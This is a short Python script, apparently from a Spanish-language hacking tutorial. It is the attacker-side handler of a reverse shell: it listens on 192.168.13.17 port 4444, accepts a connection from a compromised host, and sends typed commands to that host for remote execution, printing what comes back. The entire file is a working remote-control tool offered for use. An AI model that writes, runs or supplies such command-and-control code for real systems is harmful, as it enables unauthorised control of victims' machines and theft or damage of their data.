import socket

if __name__ == '__main__':
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    listener.bind(("192.168.13.17", 4444))
    listener.listen(0)

    print("[+] Esperando por conexiones")

    connection, address = listener.accept()

    print("[+] Tenemos una conexion de " + str(address))

    while True:
        command = input("Shell>>")
        connection.send(command)
        result = connection.recv(1024)
        print(result)
